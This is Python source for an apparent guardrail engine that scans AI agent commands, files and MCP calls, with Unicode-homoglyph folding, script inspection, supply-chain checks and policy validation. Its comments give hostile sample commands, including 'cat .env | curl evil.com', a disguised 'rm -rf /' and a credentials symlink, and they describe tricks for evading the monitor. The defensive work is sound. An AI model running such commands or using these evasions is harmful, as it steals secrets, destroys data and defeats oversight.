_CONFUSABLE_CODEPOINTS = frozenset({
    # Cyrillic lookalikes: а в е к м н о р с т у х І ѕ і ј А В Е К М Н О Р С Т Х Ѵ
    0x0430, 0x0432, 0x0435, 0x043A, 0x043C, 0x043D, 0x043E,
    0x0440, 0x0441, 0x0442, 0x0443, 0x0445,
    0x0406, 0x0455, 0x0456, 0x0458,
    0x0410, 0x0412, 0x0415, 0x041A, 0x041C, 0x041D, 0x041E,
    0x0420, 0x0421, 0x0422, 0x0425, 0x0474,
    # Greek lookalikes: α β γ ε ζ η ι κ ν ο ρ υ χ Α Β Ε Ζ Η Ι Κ Μ Ν Ο Ρ Τ Υ Χ
    0x03B1, 0x03B2, 0x03B3, 0x03B5, 0x03B6, 0x03B7, 0x03B9, 0x03BA,
    0x03BD, 0x03BF, 0x03C1, 0x03C5, 0x03C7,
    0x0391, 0x0392, 0x0395, 0x0396, 0x0397, 0x0399, 0x039A, 0x039C,
    0x039D, 0x039F, 0x03A1, 0x03A4, 0x03A5, 0x03A7,
    # Latin-extended lookalikes (ı, ł, ɑ, etc.)
    0x0131, 0x0142, 0x0251, 0x0254, 0x0257, 0x0261, 0x0274, 0x0280,
    # Fullwidth letters (NFKC would normalise but we check pre-normalise)
    # (range U+FF21–U+FF3A / U+FF41–U+FF5A handled via range test)
    # Zero-width joiners & invisible separators — often abused
    0x200B, 0x200C, 0x200D, 0x2060, 0xFEFF,
})


_INVISIBLE_CODEPOINTS: frozenset = frozenset({
    0x200B,  # zero-width space
    0x200C,  # zero-width non-joiner
    0x200D,  # zero-width joiner
    0x2060,  # word joiner
    0xFEFF,  # BOM / zero-width no-break space
})


def _has_invisible_chars(text: str) -> bool:
    """Return True if ``text`` contains invisible zero-width characters.

    Unlike ``_has_suspicious_unicode``, this fires on invisible chars alone —
    no ASCII co-presence required. Used for skill content where zero-width
    characters have no legitimate purpose and indicate hidden payload injection.
    """
    return any(ord(ch) in _INVISIBLE_CODEPOINTS for ch in text)


def _has_suspicious_unicode(text: str) -> bool:
    """Return True if ``text`` contains known confusable or invisible
    characters that enable homoglyph bypass of ASCII-based detection rules.

    Conservative: ignores text that is purely non-ASCII (legitimate non-English
    filenames shouldn't false-positive) — only fires when ASCII letters and
    confusable non-ASCII letters appear in the same token.
    """
    if not text:
        return False
    has_ascii_letter = False
    has_confusable = False
    for ch in text:
        cp = ord(ch)
        if cp < 0x80:
            if ch.isalpha():
                has_ascii_letter = True
            continue
        # Fullwidth Latin letters U+FF21–U+FF5A
        if 0xFF21 <= cp <= 0xFF5A:
            has_confusable = True
            continue
        if cp in _CONFUSABLE_CODEPOINTS:
            has_confusable = True
            continue
    return has_ascii_letter and has_confusable


# Visual-confusable → ASCII folding table, used to re-scan text that evaded
# the literal-ASCII rule patterns. Mirrors _CONFUSABLE_CODEPOINTS above (that
# set answers "is this suspicious?"; this map answers "what did it imitate?").
# Only unambiguous visual lookalikes are mapped — a wrong entry would invent
# matches, so semantic equivalents that don't LOOK like their ASCII counterpart
# are deliberately omitted.
_CONFUSABLE_FOLD = {
    # Cyrillic lowercase
    0x0430: "a", 0x0432: "b", 0x0435: "e", 0x043A: "k", 0x043C: "m",
    0x043D: "h", 0x043E: "o", 0x0440: "p", 0x0441: "c", 0x0442: "t",
    0x0443: "y", 0x0445: "x", 0x0455: "s", 0x0456: "i", 0x0458: "j",
    # Cyrillic uppercase
    0x0410: "A", 0x0412: "B", 0x0415: "E", 0x041A: "K", 0x041C: "M",
    0x041D: "H", 0x041E: "O", 0x0420: "P", 0x0421: "C", 0x0422: "T",
    0x0425: "X", 0x0406: "I", 0x0474: "V",
    # Greek lowercase
    0x03B1: "a", 0x03B2: "b", 0x03B3: "y", 0x03B5: "e", 0x03B6: "z",
    0x03B7: "n", 0x03B9: "i", 0x03BA: "k", 0x03BD: "v", 0x03BF: "o",
    0x03C1: "p", 0x03C5: "u", 0x03C7: "x",
    # Greek uppercase
    0x0391: "A", 0x0392: "B", 0x0395: "E", 0x0396: "Z", 0x0397: "H",
    0x0399: "I", 0x039A: "K", 0x039C: "M", 0x039D: "N", 0x039F: "O",
    0x03A1: "P", 0x03A4: "T", 0x03A5: "Y", 0x03A7: "X",
    # Latin-extended lookalikes
    0x0131: "i", 0x0142: "l", 0x0251: "a", 0x0254: "o", 0x0257: "d",
    0x0261: "g", 0x0274: "n", 0x0280: "r",
    # Invisible / formatting characters — deleted outright. These are the
    # cheapest evasion (`r​m -rf /`) and have no legitimate use inside
    # a command, path, or injected instruction.
    0x200B: None, 0x200C: None, 0x200D: None, 0x200E: None, 0x200F: None,
    0x2060: None, 0x2061: None, 0x2062: None, 0x2063: None, 0x2064: None,
    0xFEFF: None, 0x00AD: None,
    # Bidi embedding/override controls (Trojan Source, CVE-2021-42574). These
    # reorder how a line RENDERS without changing the codepoint sequence the
    # model reads, so a directive can display as innocuous prose and still
    # match nothing until folded.
    0x202A: None,  # LRE
    0x202B: None,  # RLE
    0x202C: None,  # PDF
    0x202D: None,  # LRO
    0x202E: None,  # RLO
    # Bidi isolates — same trick, newer mechanism.
    0x2066: None,  # LRI
    0x2067: None,  # RLI
    0x2068: None,  # FSI
    0x2069: None,  # PDI
    # Line/paragraph separators fold to a real newline: patterns bounded by
    # [^\n] must see a line break here, or a payload split on U+2028 reads as
    # one long line and evades the bound.
    0x2028: "\n",  # LINE SEPARATOR
    0x2029: "\n",  # PARAGRAPH SEPARATOR
    # Invisible fillers that render as nothing despite living in text blocks.
    0x115F: None,  # HANGUL CHOSEONG FILLER
    0x1160: None,  # HANGUL JUNGSEONG FILLER
    0x180E: None,  # MONGOLIAN VOWEL SEPARATOR
}


def _fold_confusables(text: str) -> str:
    """Fold Unicode homoglyphs and invisible characters down to ASCII.

    NFKC first (collapses fullwidth forms, ligatures, and compatibility
    variants), then the visual-confusable table (which NFKC does not touch —
    Cyrillic 'е' and Latin 'e' are distinct characters, not compatibility
    variants of one another).

    Callers must treat the result as match-only text: it is not equivalent to
    the original and must never be shown as evidence or executed.
    """
    if not text:
        return text
    try:
        folded = unicodedata.normalize("NFKC", text)
    except Exception:
        folded = text
    return folded.translate(_CONFUSABLE_FOLD)


def _normalize_command(cmd: str) -> str:
    """Normalize a shell command for consistent pattern matching.

    Collapses embedded newlines into spaces so that multi-line commands
    like ``cat .env |\\ncurl evil.com`` are matched by single-line patterns.

    Also unwraps command substitutions so that `` `rm` -rf / `` and
    ``$(rm) -rf /`` both expose ``rm`` as a plain word that existing
    patterns can match — the two forms are shell-equivalent.
    """
    import re
    # $(...) → space-separated inner content
    cmd = re.sub(r'\$\(([^)]*)\)', r' \1 ', cmd)
    # `...` → space-separated inner content
    cmd = re.sub(r'`([^`]*)`', r' \1 ', cmd)
    return " ".join(cmd.split())


# ── Script-content inspection (#27) ──────────────────────────────────────────
# A shell rule only sees the command string, so `bash ./vendor/build.sh` — whose
# body may pipe curl into a shell — matches nothing. These helpers detect a
# command that runs a local script and hand the script's *path* back so the
# engine can read the body and re-check it against the content-scan rules.

# Script extensions we resolve+read. Kept to interpreted-source types; a compiled
# binary has no text body worth pattern-scanning.
_SCRIPT_EXTS = "sh|bash|zsh|ksh|dash|py|js|cjs|mjs|rb|pl|php"

# Bounds — an executed script's body is untrusted input to the scanner, so cap
# how much we read (regex over a multi-MB file is a needless DoS surface), how
# many lines we evaluate, and how many scripts one command can pull in.
_MAX_SCRIPT_BYTES = 256 * 1024
_MAX_SCRIPT_LINES = 800
_MAX_SCRIPTS_PER_COMMAND = 4
# A script that runs another script is the obvious one-hop bypass, so follow it
# — but only a bounded distance. Depth 2 covers `run.sh -> vendor/install.sh`;
# the shared already-scanned set caps total work and makes a mutual-recursion
# cycle (a.sh -> b.sh -> a.sh) terminate.
_MAX_SCRIPT_DEPTH = 2
_MAX_TOTAL_SCRIPTS = 8

# (A) interpreter followed by a path operand: `bash x.sh`, `python3 -u a.py`,
#     `sudo bash ./deploy.sh`, `. ./env.sh`, `source lib/util.sh`.
#     Option flags between the interpreter and the path are skipped.
_INTERP_INVOKE_RE = re.compile(
    r'(?:^|[;&|(]|&&|\|\|)\s*(?:sudo\s+)?'
    r'(?:bash|sh|zsh|ksh|dash|source|\.|python3?|node(?:js)?|ruby|perl|php)\s+'
    r'(?:-[\w-]+\s+)*'
    r'(?P<path>"[^"]+"|\'[^\']+\'|[^\s;&|()]+)',
)

# (B) direct execution of a script file by path: `./vendor/x.sh`, `/opt/a.py`.
_DIRECT_EXEC_RE = re.compile(
    r'(?:^|[;&|(]|&&|\|\|)\s*'
    r'(?P<path>\.{0,2}/[^\s;&|()]*\.(?:' + _SCRIPT_EXTS + r'))\b',
)

# `cd build && bash run.sh` is an everyday idiom, and it makes the script path
# relative to the new directory rather than the workspace root. Capture leading
# `cd` targets so resolution can try them as bases too.
_CD_RE = re.compile(
    r'(?:^|[;&|(]|&&|\|\|)\s*cd\s+(?P<dir>"[^"]+"|\'[^\']+\'|[^\s;&|()]+)',
)


def _extract_cd_targets(command: str) -> List[str]:
    """Directories a command cds into, in order. Used only to widen where a
    relative script path may resolve from; every candidate still has to pass
    the workspace-containment check."""
    out: List[str] = []
    for m in _CD_RE.finditer(command):
        d = m.group("dir").strip().strip('"').strip("'")
        if d and not d.startswith("-") and d not in out:
            out.append(d)
    return out


def _extract_invoked_scripts(command: str) -> List[str]:
    """Return distinct script paths a shell command runs via an interpreter or
    direct execution. Path-shaped operands only; bare options/subcommands are
    ignored. Order-preserving and de-duplicated, capped for safety."""
    out: List[str] = []
    seen: set[str] = set()
    for rx in (_INTERP_INVOKE_RE, _DIRECT_EXEC_RE):
        for m in rx.finditer(command):
            raw = m.group("path").strip().strip('"').strip("'")
            # Skip flag-like tokens and anything that isn't a plausible path.
            if not raw or raw.startswith("-"):
                continue
            if raw in seen:
                continue
            seen.add(raw)
            out.append(raw)
            if len(out) >= _MAX_SCRIPTS_PER_COMMAND:
                return out
    return out


def _is_pre_action_event(event: Dict[str, Any]) -> bool:
    """True when the event is still pre-action (the exec can still be stopped).

    Mirrors ``hooks._is_pre_action`` (not imported: hooks imports this module),
    with one addition — an event carrying no ``agent_event`` is an ad-hoc check
    (``check_command`` / ``prismor check``) rather than a live post-action hook,
    and should still be inspected.
    """
    agent_event = str(event.get("agent_event", "") or "")
    if not agent_event:
        return True
    lower = agent_event.lower()
    return (
        lower.startswith("pre")
        or lower.startswith("before")
        or agent_event in {"PreToolUse", "UserPromptSubmit", "PermissionRequest"}
    )


def _executable_lines(body: str) -> Tuple[List[Tuple[int, str]], bool]:
    """Split a script body into the lines worth evaluating as commands.

    Returns ``([(line_number, text), ...], truncated)``. Backslash
    continuations are joined first (``\\r\\n`` included, so a Windows-authored
    script is handled), so a wrapped ``curl ... \\\n  | bash`` is judged as the
    single command it actually is. Blank and comment-only lines are dropped: a
    comment never executes, and scanning prose like ``# don't run: curl x |
    bash`` is pure false-positive surface.

    ``truncated`` is True when the line cap cut the body short — the caller
    surfaces that, because silently stopping inspection is exactly what an
    attacker padding a script is counting on.
    """
    # Join shell/py line continuations before splitting. \r\n tolerated so a
    # CRLF script's wrapped pipeline isn't split into two harmless halves.
    joined = re.sub(r'\\\r?\n', ' ', body)
    out: List[Tuple[int, str]] = []
    truncated = False
    for n, raw in enumerate(joined.split("\n"), start=1):
        line = raw.strip()
        if not line:
            continue
        if line.startswith("#") or line.startswith("//"):
            continue
        if len(out) >= _MAX_SCRIPT_LINES:
            truncated = True
            break
        out.append((n, line))
    return out, truncated


def _resolve_path(path: str) -> str:
    """Resolve symlinks so path-based rules match the real target.

    A symlink like ``config/auth.json -> ~/.claude/.credentials.json``
    would bypass rules that match ``.credentials.json`` if we only check
    the apparent path.  Returns both the original and resolved path
    separated by a newline so either can match.
    """
    if not path:
        return path
    from pathlib import Path as _Path
    try:
        resolved = str(_Path(path).resolve())
    except (OSError, ValueError):
        return path
    if resolved != path:
        return f"{path}\n{resolved}"
    return path


def _extract_fields(event: Dict[str, Any]) -> Dict[str, str]:
    """Extract all matchable fields from an event."""
    combined_parts = []
    for key in ("prompt", "response", "content", "stdout", "stderr"):
        val = event.get(key)
        if val:
            combined_parts.append(str(val))

    raw_command = str(event.get("command", ""))
    raw_path = str(event.get("path", ""))

    # Concrete tool name (set by the hook normalizer in metadata.tool_name).
    # For MCP tool calls this is the full `mcp__server__tool` tag, which lets a
    # custom rule target the tool identity itself (fields: [tool_name]) rather
    # than only its arguments. See _classify_mcp_event / the `mcp` event alias.
    meta_tool = ""
    _meta = event.get("metadata")
    if isinstance(_meta, dict):
        meta_tool = str(_meta.get("tool_name") or "")

    return {
        "command": _normalize_command(raw_command),
        "path": _resolve_path(raw_path),
        "url": str(event.get("url", "")),
        "combined_text": "\n".join(combined_parts),
        # MCP identity + arguments, exposed so a custom guardrail can match on
        # which MCP server/tool is being called (and its outbound arguments for
        # remote servers) without knowing whether the pre-call classified as a
        # `network` (remote) or `tool_result` (stdio) event. Populated only on
        # MCP events; empty elsewhere.
        "tool_name": meta_tool,
        "mcp_server": str(event.get("mcp_server", "")),
        "mcp_tool": str(event.get("mcp_tool", "")),
        "outbound_payload": str(event.get("outbound_payload", "")),
        "mcp_args": _extract_mcp_args(event),
        # Individual content fields, exposed so a rule can target a specific
        # field instead of only the folded ``combined_text``. Without these,
        # rules that declare ``fields: [prompt|response|content|stdout|stderr]``
        # (pii-exposure, model-manipulation) never matched on prompt/
        # tool_result/memory events, since the lookup fell through to "".
        # See PrismorSec/prismor#162.
        "prompt": str(event.get("prompt", "")),
        "response": str(event.get("response", "")),
        "content": str(event.get("content", "")),
        "stdout": str(event.get("stdout", "")),
        "stderr": str(event.get("stderr", "")),
        # Structural facts about a project-memory scan (see hooks._read_project_memory),
        # surfaced as "true"/"false" so a rule can match them with a plain
        # pattern (`^true$`) like any other field. Without these the
        # memory-invisible-text / memory-oversized-instruction-file rules would
        # look up a missing key, get "", and never fire.
        "has_invisible_controls": _bool_field(event, "has_invisible_controls"),
        "truncated": _bool_field(event, "truncated"),
        # GUI-agent surface (event type ui_action). Populated only on ui_action
        # events; empty elsewhere, which is what keeps a ui_action rule inert
        # against shell/file/network traffic without any extra gating.
        "control_label": str(event.get("control_label", "")),
        "ax_role": str(event.get("ax_role", "")),
        "app_name": str(event.get("app_name", "")),
        "typed_text": str(event.get("typed_text", "")),
    }


def _bool_field(event: Dict[str, Any], key: str) -> str:
    """Read a boolean event fact as "true"/"false", or "" when absent.

    Checked at the event's top level first, then in ``metadata`` (where the hook
    normalizers put scan facts). Absent stays "" rather than "false" so a rule
    that matches ``^true$`` is inert on event types that never set the field.
    """
    value = event.get(key)
    if value is None:
        meta = event.get("metadata")
        if isinstance(meta, dict):
            value = meta.get(key)
    if value is None:
        return ""
    if isinstance(value, str):
        return value.strip().lower()
    return "true" if value else "false"


def _extract_mcp_args(event: Dict[str, Any]) -> str:
    """Serialized call arguments of an MCP pre-call, whatever the transport.

    _classify_mcp_event puts a remote server's arguments in ``outbound_payload``
    and a local stdio server's in ``response`` — a rule shouldn't have to know
    which. Empty for non-MCP events, and for post-call events (there ``response``
    is the tool's *output*, not its arguments — matching it here would make an
    arg guardrail silently scan output too).
    """
    payload = str(event.get("outbound_payload", ""))
    if payload:
        return payload
    if not event.get("mcp_server"):
        return ""
    agent_event = str(event.get("agent_event", ""))
    lower = agent_event.lower()
    # Mirrors hooks._is_pre_action (not imported: hooks imports this module).
    is_pre = (
        lower.startswith("pre")
        or lower.startswith("before")
        or agent_event in {"UserPromptSubmit", "PermissionRequest"}
    )
    return str(event.get("response", "")) if is_pre else ""


def _extract_domain(url: str) -> str:
    """Extract the hostname from a URL string."""
    try:
        parsed = urlparse(url)
        if parsed.hostname:
            return parsed.hostname
    except Exception:
        pass
    return ""


# Regex to find URLs in shell commands.
_URL_IN_COMMAND_RE = re.compile(r'https?://([a-zA-Z0-9][-a-zA-Z0-9.]*[a-zA-Z0-9])')

# Splits a (possibly compound) shell command into independent sub-commands
# so an install hidden after `&&`/`;`/`|` (e.g. `cd app && npm install x`)
# is still found.
_SHELL_SEP_RE = re.compile(r'&&|\|\||[;|\n]')
_ENV_ASSIGNMENT_RE = re.compile(r'^[A-Za-z_][A-Za-z0-9_]*=')

# Bounds worst-case latency of the supply-chain check below: each package
# can cost up to one registry fetch (3s timeout) + one OSV query (4s
# timeout), so an unbounded package list could stall the hook for a long
# time on a slow/unreachable network.
_SUPPLY_CHAIN_MAX_PACKAGES_PER_COMMAND = 8

# Matches an exact-pinned npm/pnpm/yarn manifest dependency entry, e.g.
# `"lodash": "4.17.4"`. Deliberately excludes range specifiers (^, ~, >=,
# *, workspace:, etc.) — those don't resolve to a single OSV-queryable
# version, so they're left to the existing pkg-* regex rules instead.
_NPM_MANIFEST_PIN_RE = re.compile(
    r'"(@?[A-Za-z0-9_][A-Za-z0-9_.\/-]*)"\s*:\s*"(\d+\.\d+\.\d+(?:-[0-9A-Za-z.]+)?)"'
)

# Context-free pin regexes for non-npm manifests, mirroring the npm one
# above. Deliberately snippet-robust — none of these require the
# surrounding structural context (a `dependencies = [...]` array, a
# `require (...)` block, a `[dependencies]` table header) to be present
# in the same chunk of text. A single Edit tool call's `new_string` is
# often just the one inserted line, not the structure around it — exactly
# the gap that let a manifest edit bypass the npm-only version of this
# check (see policy_engine tests for the regression case). A stateful
# parser keyed off seeing the section header first (as prismor/runtime/deps.py's
# manifest parsers are, for the unrelated `prismor deps` static scan)
# would silently miss that case again.
_PIP_MANIFEST_PIN_RE = re.compile(
    r'(?<![\w.-])([A-Za-z][A-Za-z0-9_.-]*)\s*==\s*([0-9][A-Za-z0-9_.\-]*)'
)
_GO_MANIFEST_PIN_RE = re.compile(
    r'([A-Za-z0-9.\-]+(?:/[A-Za-z0-9._~\-]+)+)\s+(v\d+\.\d+\.\d+[\w.\-+]*)'
)
_CARGO_MANIFEST_PIN_RE = re.compile(
    r'([A-Za-z][A-Za-z0-9_-]*)\s*=\s*(?:"(\d[0-9A-Za-z.\-+]*)"'
    r'|\{[^}]*?version\s*=\s*"(\d[0-9A-Za-z.\-+]*)"[^}]*?\})'
)
# Cargo.toml [package] metadata keys that look like `key = "value"` but
# aren't dependencies — most importantly the crate's own `version =
# "x.y.z"` field, which is present in nearly every Cargo.toml and would
# otherwise be misread as a dependency named "version" on every write.
_CARGO_NON_DEP_KEYS = frozenset({
    "name", "version", "edition", "rust-version", "resolver", "authors",
    "license", "license-file", "description", "repository", "readme",
    "publish", "keywords", "categories", "homepage", "documentation",
})

# Manifest filename -> ecosystem, for routing a file_write event to the
# right pin regex. Mirrors prismor/runtime/deps.py's _MANIFEST_GLOBS (kept in sync
# with default_policy.yaml's manifest_patterns) but matches a basename
# directly rather than globbing a workspace, since here we only have the
# path string from the event, not a directory to scan. Maven (pom.xml)
# is intentionally absent: there is no exact-pin string parser for it and
# its OSV metadata is stub-only — see Limitations.
_MANIFEST_ECOSYSTEM_BY_NAME = {
    "package.json": "npm",
    "pyproject.toml": "pip",
    "go.mod": "go",
    "Cargo.toml": "cargo",
}
_REQUIREMENTS_TXT_RE = re.compile(r'^requirements([-_].*)?\.txt$', re.IGNORECASE)


def _manifest_ecosystem(path: str) -> Optional[str]:
    """Return the ecosystem for a manifest file path, or None if `path`
    isn't a manifest this check covers."""
    name = os.path.basename(path.split("\n", 1)[0]) if path else ""
    eco = _MANIFEST_ECOSYSTEM_BY_NAME.get(name)
    if eco:
        return eco
    if _REQUIREMENTS_TXT_RE.match(name):
        return "pip"
    return None


def _iter_install_argvs(command: str) -> List[List[str]]:
    """Split a shell command into argv lists, one per sub-command.

    Strips leading ``VAR=value`` env assignments so the package-manager
    binary lands at argv[0], where ``supplychain.ecosystems.detector.
    detect_install`` expects it.
    """
    argvs: List[List[str]] = []
    for segment in _SHELL_SEP_RE.split(command):
        segment = segment.strip()
        if not segment:
            continue
        try:
            tokens = shlex.split(segment)
        except ValueError:
            continue
        while tokens and _ENV_ASSIGNMENT_RE.match(tokens[0]):
            tokens.pop(0)
        if tokens:
            argvs.append(tokens)
    return argvs


# Bounds the transitive post-install scan: a lockfile can list hundreds
# of resolved packages, but OSV's batch+detail round trips (see
# fetch_vulns_batch) should stay bounded regardless of tree size.
_TRANSITIVE_SCAN_MAX_PACKAGES = 250

_SEVERITY_RANK = {"low": 0, "medium": 1, "high": 2, "critical": 3}


_JS_INSTALL_ECOSYSTEMS = frozenset({"npm", "pnpm", "yarn"})
# `yarn install` / `pnpm install` with no package argument resolve to no
# ecosystem via detect_install (there is nothing to name), yet a bare install is
# precisely the case the transitive scan exists for. Match the client directly.
_BARE_JS_INSTALL_RE = re.compile(
    r'\b(?:npm|pnpm|yarn)\s+(?:install|i|add|ci)\b', re.IGNORECASE)


def _is_completed_npm_install(command: str) -> bool:
    """True if `command` contains a JS-ecosystem install sub-command — used to
    trigger the post-install transitive scan regardless of whether explicit
    packages were given on the command line (a bare `npm install` is exactly
    the case that scan exists for).

    Covers npm, pnpm and yarn: all three resolve from the same registry, so OSV
    treats them as one `npm` ecosystem and `read_js_lockfiles_full` parses all
    three lockfile formats. Bun is still excluded — its lockfile is binary.
    """
    if _BARE_JS_INSTALL_RE.search(command or ""):
        return True
    try:
        from supplychain.ecosystems.detector import detect_install
    except Exception:
        return False
    for argv in _iter_install_argvs(command):
        try:
            install_event = detect_install(argv)
        except Exception:
            continue
        if install_event is not None and install_event.ecosystem in _JS_INSTALL_ECOSYSTEMS:
            return True
    return False


def _extract_domains_from_command(command: str) -> List[str]:
    """Extract domain names from URLs found in a shell command string."""
    domains: List[str] = []
    for match in _URL_IN_COMMAND_RE.finditer(command):
        host = match.group(1).split("/")[0].split(":")[0]
        if "." in host and not re.match(r'^\d{1,3}(\.\d{1,3}){3}$', host):
            domains.append(host)
    return domains


def _truncate(value: str, max_length: int = 220) -> str:
    text = str(value).strip()
    return text if len(text) <= max_length else f"{text[:max_length - 3]}..."


def _now_iso_z() -> str:
    from datetime import datetime, timezone
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


#: Parsed policy documents, keyed by the SHA-256 of the file's text.
#:
#: Every ``PolicyEngine`` construction re-parses ``default_policy.yaml`` (90 KB,
#: ~80 rules). That cost was invisible while Prismor only ran as a hook — one
#: short-lived process per tool call, the parse lost in process startup. The
#: MCP gateway made it visible: it is long-lived and evaluates twice per tool
#: call (pre + post), and each ``evaluate_tool_call`` builds two engines (one
#: directly, one inside the data-boundary classifier), so a single mirrored
#: Bash paid FOUR full YAML parses — 456 ms of the measured 670 ms per call on
#: a 2-core box.
#:
#: Keyed by content hash rather than mtime: hashing 90 KB costs ~0.05 ms
#: against a 114 ms parse, and it removes the staleness question entirely —
#: an edited policy has different bytes, so it can never be served from cache,
#: including on filesystems with coarse mtime granularity. Callers still get an
#: independent deep copy, because ``_load`` and ``_apply_override`` mutate the
#: structure they are handed.
_YAML_CACHE: Dict[str, Any] = {}
_YAML_CACHE_MAX = 16

#: libyaml's C loader when the wheel ships it (it usually does), which parses
#: the default policy ~11x faster than the pure-Python loader — same YAML 1.1
#: safe subset, so this is a drop-in.
try:  # pragma: no cover - depends on the installed PyYAML build
    from yaml import CSafeLoader as _SafeLoader  # type: ignore
except Exception:  # pragma: no cover
    _SafeLoader = getattr(yaml, "SafeLoader", None) if yaml is not None else None


def _load_yaml(path: Path) -> Optional[Dict[str, Any]]:
    """Load a YAML file. Falls back to basic parsing if PyYAML is missing.

    Repeat loads of unchanged content are served from :data:`_YAML_CACHE` as a
    deep copy — same object graph shape, same mutability, no shared state.
    """
    if not path.exists():
        return None
    text = path.read_text(encoding="utf-8")
    if yaml is not None:
        import copy as _copy
        import hashlib as _hashlib

        key = _hashlib.sha256(text.encode("utf-8")).hexdigest()
        cached = _YAML_CACHE.get(key)
        if cached is not None:
            return _copy.deepcopy(cached)
        parsed = (yaml.load(text, Loader=_SafeLoader) if _SafeLoader is not None
                  else yaml.safe_load(text))
        if len(_YAML_CACHE) >= _YAML_CACHE_MAX:
            _YAML_CACHE.clear()  # tiny working set; a plain reset beats an LRU here
        _YAML_CACHE[key] = parsed
        return _copy.deepcopy(parsed)
    # Minimal fallback: try JSON (YAML is a superset of JSON).
    import json
    try:
        return json.loads(text)
    except Exception:
        print(f"Warning: PyYAML not installed, cannot load {path}", file=sys.stderr)
        return None


# Event types and fields a rule may name. Derived from the engine's own
# dispatch tables rather than hand-listed, so the validator can never accept an
# event type evaluate() will not route or reject one it will. A typo'd
# event_type is otherwise invisible: the rule loads, matches nothing, and the
# policy looks enforced.
_VALID_EVENT_TYPES: frozenset[str] = frozenset(set(_DEFAULT_FIELDS) | {"mcp"})
_VALID_FIELDS: frozenset[str] = frozenset(_extract_fields({}))


def validate_policy(path: Path) -> List[str]:
    """Validate a policy YAML file. Returns a list of error messages (empty = valid)."""
    errors: List[str] = []
    try:
        raw = _load_yaml(path)
    except Exception as exc:
        return [f"Invalid YAML in {path}: {exc}"]
    if raw is None:
        return [f"Cannot read {path}"]
    if not isinstance(raw, dict):
        return [f"Invalid policy in {path}: expected a YAML mapping at the top level"]

    if "version" not in raw:
        errors.append("Missing required field: version")
    elif raw["version"] != "1.0":
        errors.append(f"Unsupported version: {raw['version']} (expected 1.0)")

    if "rules" not in raw:
        errors.append("Missing required field: rules")
        return errors

    seen_ids: set[str] = set()
    for i, rule in enumerate(raw.get("rules", [])):
        prefix = f"rules[{i}]"
        rule_id = rule.get("id", "")
        # A rule is either FULL (defines its own patterns) or a sparse OVERLAY
        # customization of a default rule ({id} + mode/add_patterns/disable_patterns).
        is_overlay = "patterns" not in rule and (
            "add_patterns" in rule or "disable_patterns" in rule or "mode" in rule
        )
        if is_overlay:
            if "id" not in rule:
                errors.append(f"{prefix}: missing required field 'id'")
        else:
            for field in ("id", "severity", "category", "title", "event_types", "patterns", "action"):
                if field not in rule:
                    errors.append(f"{prefix}: missing required field '{field}'")

        if rule_id in seen_ids:
            errors.append(f"{prefix}: duplicate rule id '{rule_id}'")
        seen_ids.add(rule_id)

        for j, pattern in enumerate(rule.get("patterns", [])):
            try:
                re.compile(pattern)
            except re.error as e:
                errors.append(f"{prefix}.patterns[{j}]: invalid regex: {e}")

        # Custom added patterns must compile.
        for j, pattern in enumerate(rule.get("add_patterns", []) or []):
            try:
                re.compile(str(pattern))
            except re.error as e:
                errors.append(f"{prefix}.add_patterns[{j}]: invalid regex: {e}")

        # Core protections are add-only: their patterns can't be disabled.
        # (Replacing a core rule's patterns is blocked at merge time + by the
        # control-plane overlay validator; the default policy file legitimately
        # defines core patterns, so we don't flag `patterns` here.)
        if rule_id in _NON_OVERRIDABLE_RULE_IDS and rule.get("disable_patterns"):
            errors.append(f"{prefix}: rule '{rule_id}' is a core protection — disable_patterns is not allowed")

        for j, et in enumerate(rule.get("event_types", []) or []):
            if et not in _VALID_EVENT_TYPES:
                errors.append(
                    f"{prefix}.event_types[{j}]: unknown event type '{et}' "
                    f"(one of {', '.join(sorted(_VALID_EVENT_TYPES))})")
        for j, fname in enumerate(rule.get("fields", []) or []):
            if fname not in _VALID_FIELDS:
                errors.append(
                    f"{prefix}.fields[{j}]: unknown field '{fname}' "
                    f"(one of {', '.join(sorted(_VALID_FIELDS))})")

        action = rule.get("action", "")
        if action and action not in ("block", "warn", "log", "modify", "step_up", "defer"):
            errors.append(f"{prefix}: invalid action '{action}' (must be block, warn, log, modify, step_up, or defer)")

    for i, entry in enumerate(raw.get("allowlists", []) or []):
        prefix = f"allowlists[{i}]"
        for field in ("id", "rule_ids", "patterns"):
            if field not in entry:
                errors.append(f"{prefix}: missing required field '{field}'")
        entry_type = entry.get("type")
        if entry_type is not None and entry_type not in ("allow", "veto"):
            errors.append(f"{prefix}: invalid type '{entry_type}' (must be allow or veto)")
        for j, pattern in enumerate(entry.get("patterns", [])):
            try:
                re.compile(pattern)
            except re.error as e:
                errors.append(f"{prefix}.patterns[{j}]: invalid regex: {e}")

    # settings.tool_tags: lint tag-rule expressions + legacy incompatible sets,
    # for the fleet block AND each per-agent overlay under `agents:`. A broken
    # rule hidden in an overlay is exactly as broken as one in the fleet block,
    # and considerably harder to notice.
    tt = ((raw.get("settings") or {}).get("tool_tags") or {})
    if isinstance(tt, dict):
        from prismor.runtime.tag_rules import ParseError as _TagParseError, compile_rule as _compile_tag_rule

        def _lint_tag_block(block: Dict[str, Any], where: str) -> None:
            for i, entry in enumerate(block.get("rules") or []):
                prefix = f"{where}.rules[{i}]"
                expr = entry if isinstance(entry, str) else (
                    entry.get("expr") if isinstance(entry, dict) else None)
                if not isinstance(expr, str):
                    errors.append(f"{prefix}: must be a string or an {{expr, action}} map")
                    continue
                try:
                    _compile_tag_rule(expr)
                except _TagParseError as e:
                    errors.append(f"{prefix}: {e.args[0]} in \"{expr}\"")
                if isinstance(entry, dict) and entry.get("action") not in (None, "block", "warn"):
                    errors.append(f"{prefix}: invalid action '{entry.get('action')}' (block or warn)")
            for i, combo in enumerate(block.get("incompatible") or []):
                if not isinstance(combo, (list, tuple)) or len({str(t) for t in combo}) < 2:
                    errors.append(f"{where}.incompatible[{i}]: needs at least 2 distinct tags")

        _lint_tag_block(tt, "settings.tool_tags")

        agents = tt.get("agents")
        if agents is not None and not isinstance(agents, dict):
            errors.append("settings.tool_tags.agents: must be a map of agent name -> overlay")
        elif isinstance(agents, dict):
            for name, sub in agents.items():
                where = f"settings.tool_tags.agents.{name}"
                if not isinstance(sub, dict):
                    errors.append(f"{where}: must be a map")
                    continue
                mode = sub.get("mode")
                if mode is not None and str(mode).lower() not in ("observe", "enforce"):
                    errors.append(f"{where}.mode: must be observe or enforce")
                _lint_tag_block(sub, where)

    return errors


def export_effective_policy(engine: "PolicyEngine") -> Dict[str, Any]:
    """Serialize a loaded engine as the effective policy, ready for JSON.

